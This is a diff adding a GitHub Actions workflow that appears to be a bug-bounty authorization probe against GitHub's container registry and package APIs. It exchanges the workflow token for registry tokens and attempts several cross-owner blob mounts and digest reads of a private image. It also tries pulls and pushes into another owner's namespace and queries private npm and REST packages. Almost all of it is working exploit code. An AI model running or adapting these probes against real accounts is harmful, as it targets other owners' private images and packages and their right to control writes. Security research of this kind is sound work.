@@ -1,0 +1,76 @@
+name: pkg-authz-ab
+on:
+  push:
+    branches: [evil]
+    paths: ['trigger-pkg*.txt']
+permissions:
+  packages: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      GHT: ${{ secrets.GITHUB_TOKEN }}
+      SRC_DIGEST: sha256:d22445629935080d613ac6d58c456d839a768e73531519a867757ba944a50b42
+      CFG_DIGEST: sha256:5aac2f85420968ac4d13df263a4d7845da56acd4b4b8e1afa8d1ff167b4e67bc
+    steps:
+      - name: probes
+        run: |
+          set +e
+          r() { local label=$1 m=$2 u=$3; shift 3
+               local code; code=$(curl -s -o /tmp/b -D /tmp/h -w '%{http_code}' -X "$m" "$@" "$u")
+               echo "== [$label] $m $u => $code"
+               grep -iE '^(location|docker-content-digest|www-authenticate|content-length|content-type):' /tmp/h | tr -d '\r' | sed 's/^/     /'
+               echo "     body: $(head -c 300 /tmp/b | tr -d '\0')"; }
+          echo "### STEP 0: token exchanges with GITHUB_TOKEN"
+          curl -s -u "x:$GHT" -o /tmp/t1 -w 'own-scope token exchange => %{http_code}\n' "https://ghcr.io/token?service=ghcr.io&scope=repository:hackerone-pr0/wf-img:push,pull"
+          T1=$(python3 -c "import json;print(json.load(open('/tmp/t1')).get('token',''))"); echo "::add-mask::$T1"
+          echo "own-scope token: len=${#T1} dots=$(printf %s "$T1" | tr -cd . | wc -c) b64decode-prefix=$(printf %s "$T1" | base64 -d 2>/dev/null | cut -c1-4)"
+          curl -s -u "x:$GHT" -o /tmp/t2 -w 'cross-owner-scope token exchange => %{http_code}\n' "https://ghcr.io/token?service=ghcr.io&scope=repository:hackerone-pr0/mount-img:push,pull&scope=repository:hackerone-poc/priv-img:pull"
+          T2=$(python3 -c "import json;print(json.load(open('/tmp/t2')).get('token',''))"); echo "::add-mask::$T2"
+          echo "cross-owner-scope token: len=${#T2} same_as_own=$([ "$T1" = "$T2" ] && echo yes || echo no) body_keys=$(python3 -c "import json;print(list(json.load(open('/tmp/t2'))))")"
+          A="Authorization: Bearer $T1"
+          echo "### STEP 1: POSITIVE CONTROL push ghcr.io/hackerone-pr0/wf-img:1"
+          mkdir -p /tmp/rf && echo "WF-IMG-SECRET-$RANDOM$RANDOM" > /tmp/rf/wf.txt && tar --owner=0 --group=0 --mtime=2026-01-01 -C /tmp/rf -cf /tmp/layer.tar wf.txt
+          LD=$(sha256sum /tmp/layer.tar | cut -d' ' -f1); LS=$(wc -c < /tmp/layer.tar)
+          printf '{"architecture":"amd64","os":"linux","config":{"Labels":{"org.opencontainers.image.source":"https://github.com/hackerone-pr0/pg-003-collab"}},"rootfs":{"type":"layers","diff_ids":["sha256:%s"]}}' "$LD" > /tmp/cfg.json
+          CD=$(sha256sum /tmp/cfg.json | cut -d' ' -f1); CS=$(wc -c < /tmp/cfg.json)
+          up() { r "upload-start $2" POST "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/uploads/" -H "$A" -H "Content-Length: 0"
+                 loc=$(grep -i '^location:' /tmp/h | cut -d' ' -f2- | tr -d '\r'); case "$loc" in http*) ;; *) loc="https://ghcr.io$loc";; esac
+                 case "$loc" in *\?*) sep='&';; *) sep='?';; esac
+                 r "upload-put $2" PUT "${loc}${sep}digest=sha256:$2" -H "$A" -H "Content-Type: application/octet-stream" --data-binary @"$1"; }
+          up /tmp/layer.tar "$LD"; up /tmp/cfg.json "$CD"
+          printf '{"schemaVersion":2,"mediaType":"application/vnd.oci.image.manifest.v1+json","config":{"mediaType":"application/vnd.oci.image.config.v1+json","digest":"sha256:%s","size":%s},"layers":[{"mediaType":"application/vnd.oci.image.layer.v1.tar","digest":"sha256:%s","size":%s}],"annotations":{"org.opencontainers.image.source":"https://github.com/hackerone-pr0/pg-003-collab"}}' "$CD" "$CS" "$LD" "$LS" > /tmp/man.json
+          r "manifest-put wf-img:1" PUT "https://ghcr.io/v2/hackerone-pr0/wf-img/manifests/1" -H "$A" -H "Content-Type: application/vnd.oci.image.manifest.v1+json" --data-binary @/tmp/man.json
+          r "verify own manifest" GET "https://ghcr.io/v2/hackerone-pr0/wf-img/manifests/1" -H "$A" -H "Accept: application/vnd.oci.image.manifest.v1+json"
+          echo "### STEP 2: TEST 1 cross-owner blob mount from hackerone-poc/priv-img (private, other owner)"
+          r "T1a mount dest=mount-img from=priv-img" POST "https://ghcr.io/v2/hackerone-pr0/mount-img/blobs/uploads/?mount=$SRC_DIGEST&from=hackerone-poc/priv-img" -H "$A" -H "Content-Length: 0"
+          r "T1b mount dest=wf-img(existing) from=priv-img" POST "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/uploads/?mount=$SRC_DIGEST&from=hackerone-poc/priv-img" -H "$A" -H "Content-Length: 0"
+          r "T1c mount no-from dest=wf-img" POST "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/uploads/?mount=$SRC_DIGEST" -H "$A" -H "Content-Length: 0"
+          r "T1d mount config digest from=priv-img" POST "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/uploads/?mount=$CFG_DIGEST&from=hackerone-poc/priv-img" -H "$A" -H "Content-Length: 0"
+          r "T1e mount with cross-scope token T2" POST "https://ghcr.io/v2/hackerone-pr0/mount-img/blobs/uploads/?mount=$SRC_DIGEST&from=hackerone-poc/priv-img" -H "Authorization: Bearer $T2" -H "Content-Length: 0"
+          r "T1f mount from=HackerOne-Poc/priv-img (case)" POST "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/uploads/?mount=$SRC_DIGEST&from=HackerOne-Poc/priv-img" -H "$A" -H "Content-Length: 0"
+          r "T1g mount from nonexistent src (control)" POST "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/uploads/?mount=$SRC_DIGEST&from=hackerone-pr0/zz-nonexistent" -H "$A" -H "Content-Length: 0"
+          r "T1h mount own blob same-owner (positive control)" POST "https://ghcr.io/v2/hackerone-pr0/mount-img/blobs/uploads/?mount=sha256:$LD&from=hackerone-pr0/wf-img" -H "$A" -H "Content-Length: 0"
+          echo "### STEP 3: blob-by-digest reads of B's private layer under names A can read"
+          r "GET mount-img/blobs/SRC" GET "https://ghcr.io/v2/hackerone-pr0/mount-img/blobs/$SRC_DIGEST" -H "$A"
+          r "GET wf-img/blobs/SRC" GET "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/$SRC_DIGEST" -H "$A"
+          r "HEAD wf-img/blobs/SRC" HEAD "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/$SRC_DIGEST" -H "$A"
+          r "GET wf-img/blobs/CFG" GET "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/$CFG_DIGEST" -H "$A"
+          r "GET wf-img/blobs/own-layer (control)" GET "https://ghcr.io/v2/hackerone-pr0/wf-img/blobs/sha256:$LD" -H "$A"
+          echo "### STEP 4: TEST 5 reach into B's namespace with GITHUB_TOKEN"
+          r "T5a pull B private manifest" GET "https://ghcr.io/v2/hackerone-poc/priv-img/manifests/1" -H "$A" -H "Accept: application/vnd.oci.image.manifest.v1+json"
+          r "T5b pull B private blob" GET "https://ghcr.io/v2/hackerone-poc/priv-img/blobs/$SRC_DIGEST" -H "$A"
+          r "T5c nonexistent B manifest (shape control)" GET "https://ghcr.io/v2/hackerone-poc/zz-nonexistent/manifests/1" -H "$A" -H "Accept: application/vnd.oci.image.manifest.v1+json"
+          r "T5d push B namespace upload-start" POST "https://ghcr.io/v2/hackerone-poc/evil/blobs/uploads/" -H "$A" -H "Content-Length: 0"
+          r "T5e push B namespace manifest PUT" PUT "https://ghcr.io/v2/hackerone-poc/evil/manifests/1" -H "$A" -H "Content-Type: application/vnd.oci.image.manifest.v1+json" --data-binary @/tmp/man.json
+          r "T5f push B namespace via raw GITHUB_TOKEN basic" POST "https://ghcr.io/v2/hackerone-poc/evil/blobs/uploads/" -u "x:$GHT" -H "Content-Length: 0"
+          r "T5g push own OTHER repo name (not linked) upload-start" POST "https://ghcr.io/v2/hackerone-pr0/unlinked-img/blobs/uploads/" -H "$A" -H "Content-Length: 0"
+          echo "### STEP 5: npm.pkg.github.com + REST with GITHUB_TOKEN"
+          r "npm GET B private pkg" GET "https://npm.pkg.github.com/@hackerone-poc/priv-pkg" -H "Authorization: Bearer $GHT"
+          r "npm GET B nonexistent pkg" GET "https://npm.pkg.github.com/@hackerone-poc/zz-nonexistent" -H "Authorization: Bearer $GHT"
+          r "npm GET own-scope nonexistent" GET "https://npm.pkg.github.com/@hackerone-pr0/zz-nonexistent" -H "Authorization: Bearer $GHT"
+          r "REST B private pkg" GET "https://api.github.com/users/HackerOne-Poc/packages/container/priv-img" -H "Authorization: Bearer $GHT" -H "Accept: application/vnd.github+json"
+          r "REST B nonexistent pkg" GET "https://api.github.com/users/HackerOne-Poc/packages/container/zz-nonexistent" -H "Authorization: Bearer $GHT" -H "Accept: application/vnd.github+json"
+          r "REST own wf-img pkg" GET "https://api.github.com/users/hackerone-pr0/packages/container/wf-img" -H "Authorization: Bearer $GHT" -H "Accept: application/vnd.github+json"
+          echo "### DONE"
